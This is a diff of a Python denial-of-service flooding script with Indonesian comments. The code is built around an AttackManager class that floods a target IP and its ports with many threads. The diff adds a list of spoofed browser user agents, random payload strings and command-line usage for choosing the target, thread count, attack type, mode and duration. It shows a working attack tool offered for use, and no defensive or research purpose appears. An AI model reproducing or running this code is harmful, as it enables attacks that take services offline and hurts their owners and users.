@@ -8,13 +8,14 @@ import selectors
 import queue
 from colorama import init, Fore
 
-# --- Inisialisasi ---
-init() # Pastikan colorama terinisialisasi
-print(Fore.CYAN + "-"*60) # Garis pemisah awal
-print(Fore.CYAN + "Inisialisasi...")
-print(Fore.CYAN + "-"*60)
+# --- Konfigurasi Logging ---
+# Konfigurasi logging harus dilakukan sekali, bisa di awal atau di dalam if __name__
+LOG_FILENAME = 'attack_log.txt'
+logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 # --- Banner ---
+# Banner sebaiknya didefinisikan di sini, tapi dicetak hanya sekali di __main__
 BANNER = Fore.CYAN + r"""
 KUMPULAN PARA MENTOR MODUS DUIT
 ____   ___   ___              _     
@@ -24,21 +25,47 @@ ____   ___   ___              _
 |_____|\___/ \___/  |_| |_| |_|_.__/ 
   ADAKAH SERATUS BUAT BELI DATA ??                                   
 """
-print(BANNER) # <<< Pindahkan print(BANNER) ke sini agar lebih awal
-print("\n" + Fore.CYAN + "-"*60) # Garis pemisah setelah banner
-
-# Konfigurasi Logging (setelah banner)
-LOG_FILENAME = 'attack_log.txt'
-logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-
 
 # --- User Agents ---
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    # ... (daftar user agents lainnya tetap sama) ...
+    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
 ]
+
+# --- Helper Functions (Global) ---
+def get_random_user_agent():
+    return random.choice(USER_AGENTS)
+
+def generate_random_string(length=100):
+    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def parse_http_status(response_data):
+    if not response_data: return None, "No Response Data"
+    try:
+        response_str = response_data.decode('utf-8', errors='ignore')
+        if "HTTP/" in response_str:
+            status_line = response_str.split('\r\n')[0]
+            parts = status_line.split(' ')
+            if len(parts) >= 2: return parts[1], status_line
+        return None, "Non-HTTP Response"
+    except Exception: return None, "Error Parsing Response"
 
 # --- Attack Manager Class ---
 class AttackManager:
@@ -51,7 +78,6 @@ class AttackManager:
         self.duration_sec = duration_sec
         self.http_method = http_method.upper()
 
-        # State sebagai atribut instance
         self.sent_requests_total = 0
         self.active_connections = 0
         self.error_count = 0
@@ -327,13 +353,10 @@ class AttackManager:
 
     # --- Main Control Methods ---
     def start(self):
-        # Banner dicetak di sini agar lebih awal, di luar kelas jika ingin, tapi di dalam kelas untuk referensi objek.
-        # Saya tetap meletakkannya di atas kelas agar langsung terlihat.
-        
         print(f"\n{Fore.GREEN}Starting {self.attack_type.upper()} ({self.mode.upper()}) attack on {self.target_ip} on ports {self.ports_to_attack} with {self.threads_per_port} threads/port (Method: {self.http_method}). Duration: {'Unlimited' if self.duration_sec is None else f'{self.duration_sec}s'}...{Fore.RESET}")
         
-        stats_thread = threading.Thread(target=self._stats_display, daemon=True)
-        stats_thread.start()
+        self._stats_thread = threading.Thread(target=self._stats_display, daemon=True)
+        self._stats_thread.start()
 
         for port in self.ports_to_attack:
             for _ in range(self.threads_per_port):
@@ -348,7 +371,6 @@ class AttackManager:
                 self.attack_threads.append(thread)
                 thread.start()
         
-        # Main loop for duration or manual stop
         if self.duration_sec is not None:
             attack_start_time = time.time()
             while time.time() - attack_start_time < self.duration_sec:
@@ -362,15 +384,13 @@ class AttackManager:
             while not self.stop_event.is_set():
                 time.sleep(1)
 
-    def stop(self): # Mengganti stop_attack menjadi stop untuk kesederhanaan
+    def stop(self):
         logging.info("Stopping all threads.")
         self.stop_event.set()
         
-        # Tunggu thread statistik berhenti
         if hasattr(self, '_stats_thread') and self._stats_thread.is_alive():
             self._stats_thread.join(timeout=1.5)
         
-        # Tunggu thread serangan berhenti
         for t in self.attack_threads:
             if t.is_alive():
                 t.join(timeout=0.5) 
@@ -378,21 +398,14 @@ class AttackManager:
 
 # --- Main Execution ---
 if __name__ == "__main__":
-    # Peringatan & Banner
+    # Pindahkan semua inisialisasi dan pencetakan awal ke sini
+    init() # Inisialisasi colorama
+    
     print(Fore.CYAN + "-"*60)
     print(Fore.CYAN + "Inisialisasi...")
     print(Fore.CYAN + "-"*60)
     
-    BANNER = Fore.CYAN + r"""
-KUMPULAN PARA MENTOR MODUS DUIT
-____   ___   ___              _     
-|___ \ / _ \ / _ \   _ __ ___ | |__  
-  __) | | | | | | | | '_ ` _ \| '_ \ 
- / __/| |_| | |_| | | | | | | | |_) |
-|_____|\___/ \___/  |_| |_| |_|_.__/ 
-  ADAKAH SERATUS BUAT BELI DATA ??                                   
-"""
-    print(BANNER)
+    print(BANNER) # Banner dicetak hanya di sini
     print("\n" + Fore.CYAN + "-"*60)
     
     print(f"{Fore.YELLOW}!!! PERINGATAN !!!{Fore.RESET}")
@@ -402,8 +415,9 @@ ____   ___   ___              _
     print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
     
     try:
-        time.sleep(5)
+        time.sleep(5) # Jeda sebelum memulai parsing argumen
         
+        # Parsing argumen command line
         if len(sys.argv) < 7: 
             print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]")
             print("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
@@ -477,7 +491,7 @@ ____   ___   ___              _
         # Buat instance AttackManager
         manager = AttackManager(target_ip, ports_to_attack, threads_per_port, attack_type, mode, attack_duration, http_method)
         
-        # Simpan thread stats di manager agar bisa diakses saat stop
+        # Mulai thread statistik, simpan referensinya di manager
         manager._stats_thread = threading.Thread(target=manager._stats_display, daemon=True)
         manager._stats_thread.start()
 
@@ -486,16 +500,17 @@ ____   ___   ___              _
         
     except KeyboardInterrupt:
         print("\nAttack interrupted by user. Stopping...")
-        if 'manager' in locals(): # Pastikan manager sudah diinisialisasi
+        if 'manager' in locals() and manager is not None: 
             manager.stop()
-        else: # Jika KeyboardInterrupt sebelum manager dibuat
+        else: 
             sys.exit(1)
     except Exception as e:
         print(f"\nAn unexpected error occurred during attack execution: {e}")
-        if 'manager' in locals(): # Pastikan manager sudah diinisialisasi
+        if 'manager' in locals() and manager is not None: 
             manager.stop()
         else:
             sys.exit(1)
         logging.critical(f"Attack execution error: {e}")
 
     logging.info("Program finished.")
+
